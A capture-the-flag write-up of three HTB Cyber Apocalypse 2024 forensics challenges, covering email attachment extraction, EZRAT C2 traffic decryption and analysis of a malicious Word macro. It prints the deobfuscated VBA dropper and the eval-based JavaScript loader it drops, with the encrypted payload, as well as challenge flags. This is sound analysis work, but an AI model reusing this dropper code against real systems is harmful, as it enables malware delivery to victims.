# Cyber Apocalypse 2024: Hacker Royale

# Forensics[medium] - Phreaky

1. Export eml files from wireshark
2. Extract attachments from EML files in the current dir, and write them to the output subdir: 

[https://gist.github.com/urschrei/5258588](https://gist.github.com/urschrei/5258588)

1. Command used:
    
    `cat *.eml | grep -e 'filename\|Password'`  - retrieve all filenames with respective password
    
    `unzip -P [password] [filename]` 
    
    `cat phreaks_plan.pdf.part* > phreaks_plan.pdf`  - merge all part files into one file
    
2. Repair the pdf file as its unable to read on kali linux 

[Repair PDF - Repair PDF online & for free](https://www.pdf2go.com/repair-pdf)

# Forensics[medium] - Data Siege

From the wireshark file, I have exported three objects from HTTP: one EZRAT client exe and two xml beans files. According to the scenario, the flag is separated into three parts. 

## First Part `HTB{c0mmun1c4710n5`, Second Part `_h45_b33n_r357`

By using strings on the exe file, it shows the malware is built based on .NET framework.

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled.png)

Using ILSpy, I decompiled the executable file and retrieved the encrypt and decrypt function. The encrypt and decrypt function uses a fix key and salt that enables me to reproduce the key and IV used in the process. 

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%201.png)

Using the original decrypt function, I took the base64 data in wireshark sent and received via port 1234 (c2 port) and retrieve the information that lies within it.

- Decryption Code
    
    ```csharp
    using System;
    using System.IO;
    using System.Security.Cryptography;
    using System.Text;
    
    public class Program
    {
        public static void Main()
        {
            string cipherText = "zVmhuROwQw02oztmJNCvd2v8wXTNUWmU3zkKDpUBqUON+hKOocQYLG0pOhERLdHDS+yw3KU6RD9Y4LDBjgKeQnjml4XQMYhl6AFyjBOJpA4UEo2fALsqvbU4Doyb/gtg";
            byte[] key, iv;
            byte[] decryptedBytes = Decrypt(cipherText, out key, out iv);
    
            // Convert bytes to string for display
            string decryptedText = Encoding.UTF8.GetString(decryptedBytes);
    
            Console.WriteLine("Decrypted Text: " + decryptedText);
            // Console.WriteLine("AES Key (Hex): " + BitConverter.ToString(key).Replace("-", ""));
            // Console.WriteLine("AES IV (Hex): " + BitConverter.ToString(iv).Replace("-", ""));
        }
    
        public static byte[] Decrypt(string cipherText, out byte[] key, out byte[] iv)
        {
            string encryptKey = Constantes.EncryptKey;
            byte[] array = Convert.FromBase64String(cipherText);
    
            using (Aes aes = Aes.Create())
            {
                Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(encryptKey, new byte[13]
                {
                    86, 101, 114, 121, 95, 83, 51, 99, 114, 51,
                    116, 95, 83
                });
    
                aes.Key = rfc2898DeriveBytes.GetBytes(32);
                aes.IV = rfc2898DeriveBytes.GetBytes(16);
    
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(array, 0, array.Length);
                        cryptoStream.Close();
                    }
    
                    byte[] decryptedBytes = memoryStream.ToArray();
    
                    key = aes.Key;
                    iv = aes.IV;
    
                    return decryptedBytes;
                }
            }
        }
    }
    
    public static class Constantes
    {
        public const string EncryptKey = "VYAemVeO3zUDTL6N62kVA";
    }
    
    ```
    

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%202.png)

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%203.png)

## Third Part `0r3d_1n_7h3_h34dqu4r73r5}`

Knowing that its a RAT client, there’s definitely a connection to command and control. Looking in the tcp connections, there’s one involving powershell commands.

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%204.png)

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%205.png)

Ant there’s the third part of flag

# Forensics[hard] - Game Invitation

[How to Analyze Malicious Microsoft Office Files](https://intezer.com/blog/malware-analysis/analyze-malicious-microsoft-office-files/)

Reference for analyzing VBA in malicious office files

Using both Virustotal SecondWrite report and https://github.com/decalage2/oletools can extract the VBA code that lies within the document. 

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%206.png)

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%207.png)

- VBA de-obfuscated code
    
    ```visual-basic
    Attribute VB_Name = "NewMacros"
    Public ScriptFilePath As String
    Public AppDataPath As String
    
    Function DecodeByteArray(input_array() As Byte, length As Long) As Boolean
        Dim xor_key As Byte
        xor_key = 45
        For i = 0 To length - 1
            input_array(i) = input_array(i) Xor xor_key
            xor_key = ((xor_key Xor 99) Xor (i Mod 254))
        Next i
        DecodeByteArray = True
    End Function
    
    Sub CleanUp()
        On Error Resume Next
        Kill ScriptFilePath
        On Error Resume Next
        Set fsObj = CreateObject("Scripting.FileSystemObject")
        fsObj.DeleteFile AppDataPath & "\*.*", True
        Set fsObj = Nothing
    End Sub
    
    Sub RunOnDocumentOpen()
        On Error GoTo ErrorHandler
        Dim targetDomain As String
        Dim currentUserDomain As String
        targetDomain = "GAMEMASTERS.local"
        currentUserDomain = Environ$("UserDomain")
        If targetDomain <> currentUserDomain Then
        Else
            Dim fileContents
            Dim fileLength As Long
            Dim length As Long
            fileLength = FileLen(ActiveDocument.FullName)
            fileContents = FreeFile
            Open (ActiveDocument.FullName) For Binary As #fileContents
            Dim byteArray() As Byte
            ReDim byteArray(fileLength)
            Get #fileContents, 1, byteArray
            Dim documentText As String
            documentText = StrConv(byteArray, vbUnicode)
            Dim match, regexMatches
            Dim regex
            Set regex = CreateObject("vbscript.regexp")
            regex.Pattern = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
            Set regexMatches = regex.Execute(documentText)
            Dim matchIndex
            If regexMatches.Count = 0 Then
                GoTo ErrorHandler
            End If
            For Each match In regexMatches
                matchIndex = match.FirstIndex
                Exit For
            Next
            Dim decodedArray() As Byte
            Dim arrayLength As Long
            arrayLength = 13082
            ReDim decodedArray(arrayLength)
            Get #fileContents, matchIndex + 81, decodedArray
            If Not DecodeByteArray(decodedArray(), arrayLength + 1) Then
                GoTo ErrorHandler
            End If
            AppDataPath = Environ("appdata") & "\Microsoft\Windows"
            Set fsObj = CreateObject("Scripting.FileSystemObject")
            If Not fsObj.FolderExists(AppDataPath) Then
                AppDataPath = Environ("appdata")
            End If
            Set fsObj = Nothing
            Dim newFile
            newFile = FreeFile
            ScriptFilePath = AppDataPath & "\mailform.js"
            Open (ScriptFilePath) For Binary As #newFile
            Put #newFile, 1, decodedArray
            Close #newFile
            Erase decodedArray
            Set shellObj = CreateObject("WScript.Shell")
            shellObj.Run """" + ScriptFilePath + """" + " vF8rdgMHKBrvCoCp0ulm"
            ActiveDocument.Save
            Exit Sub
    ErrorHandler:
            Close #newFile
            ActiveDocument.Save
        End If
    End Sub
    
    ```
    

From the code, the script reads the file content and find a match to a regex pattern. As its a binary file, I’ve converted the binary file into a huge chunk of hex code using `xxd -p invitation.docm | tr -d '\n' > invitation_hex.txt` . According to the code, after finding the index of first matched byte + 81, we then retrieve a size of 13082 bytes as the array and pass it into `DecodeByteArray`function.

```bash
grep -ob '735763445770333678356f496532684a476e5279316943393241636451674f38524c696f565a576c68434b4a58485253714f3435304169714c5a794c46655859696c43746f72673070335264616f5061' invitation_hex.txt 
# 260306:735763445770333678356f496532684a476e5279316943393241636451674f38524c696f565a576c68434b4a58485253714f3435304169714c5a794c46655859696c43746f72673070335264616f5061
# the first character lies at 260306, which means the first byte match should be at 260306/2 = 130153

dd if=invitation_hex.txt bs=2 skip=$((130153 + 80)) count=13082 2>/dev/null > decodearray.txt
# if = 
# if=invitation_hex.txt: Specifies the input file.
# bs=2: Sets the block size to 2 byte as its hex
# skip=$((130153 + 80)): Skips to the start position after the match
# count=13082 : Specifies the number of bytes to read, which is the size of decodeArray
# 2>/dev/null: Redirects dd's error output to /dev/null to suppress any error messages.
```

Now, we got the file with the extracted hex values: `decodearray.txt` . By implementing the function from visual basic to python, we can retrieve the contents of `mailform.js`  created by the vba script. 

- `DecodeByteArray()` in python
    
    ```python
    def decode_byte_array(input_array, xor_key):
        decoded_array = bytearray(len(input_array))
        for i in range(len(input_array)):
            decoded_array[i] = input_array[i] ^ xor_key
            xor_key = (xor_key ^ 99) ^ (i % 254)
        return decoded_array
    
    def hex_to_bytes(hex_string):
        return bytearray.fromhex(hex_string)
    
    def main():
        # Read input from "decodeArray.txt"
        with open("decodearray.txt", "r") as file:
            hex_string = file.read().strip()
    
        # Convert hex string to bytes
        input_bytes = hex_to_bytes(hex_string)
    
        # Set initial XOR key
        initial_xor_key = 45
    
        # Call the decode function
        decoded_bytes = decode_byte_array(input_bytes, initial_xor_key)
        print(decoded_bytes)
        # Write the decoded bytes to a new file
        with open("decoded_output.txt", "wb") as output_file:
            output_file.write(decoded_bytes)
    
    if __name__ == "__main__":
        main()
    
    ```
    
- Contents of `mailform.js`
    
    ```jsx
    var lVky = WScript.Arguments; // ref: https://ss64.com/vb/arguments.html
    var DASz = lVky(0);
    var Iwlh = lyEK();
    Iwlh = JrvS(Iwlh);
    Iwlh = xR68(DASz, Iwlh);
    eval(Iwlh);
    
    function af5Q(r) {
        var a = r.charCodeAt(0);
        if (a === 43 || a === 45) return 62;
        if (a === 47 || a === 95) return 63;
        if (a < 48) return -1;
        if (a < 48 + 10) return a - 48 + 26 + 26;
        if (a < 65 + 26) return a - 65;
        if (a < 97 + 26) return a - 97 + 26
    }
    
    function JrvS(r) {
        var a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        var t;
        var l;
        var h;
        if (r.length % 4 > 0) return;
        var u = r.length;
        var g = r.charAt(u - 2) === "=" ? 2 : r.charAt(u - 1) === "=" ? 1 : 0;
        var n = new Array(r.length * 3 / 4 - g);
        var i = g > 0 ? r.length - 4 : r.length;
        var z = 0;
    
        function b(r) {
            n[z++] = r
        }
        for (t = 0, l = 0; t < i; t += 4, l += 3) {
            h = af5Q(r.charAt(t)) << 18 | af5Q(r.charAt(t + 1)) << 12 | af5Q(r.charAt(t + 2)) << 6 | af5Q(r.charAt(t + 3));
            b((h & 16711680) >> 16);
            b((h & 65280) >> 8);
            b(h & 255)
        }
        if (g === 2) {
            h = af5Q(r.charAt(t)) << 2 | af5Q(r.charAt(t + 1)) >> 4;
            b(h & 255)
        } else if (g === 1) {
            h = af5Q(r.charAt(t)) << 10 | af5Q(r.charAt(t + 1)) << 4 | af5Q(r.charAt(t + 2)) >> 2;
            b(h >> 8 & 255);
            b(h & 255)
        }
        return n
    }
    
    function xR68(r, a) {
        var t = [];
        var l = 0;
        var h;
        var u = "";
        for (var g = 0; g < 256; g++) {
            t[g] = g
        }
        for (var g = 0; g < 256; g++) {
            l = (l + t[g] + r.charCodeAt(g % r.length)) % 256;
            h = t[g];
            t[g] = t[l];
            t[l] = h
        }
        var g = 0;
        var l = 0;
        for (var n = 0; n < a.length; n++) {
            g = (g + 1) % 256;
            l = (l + t[g]) % 256;
            h = t[g];
            t[g] = t[l];
            t[l] = h;
            u += String.fromCharCode(a[n] ^ t[(t[g] + t[l]) % 256])
        }
        return u
    }
    
    function lyEK() {
        var r = "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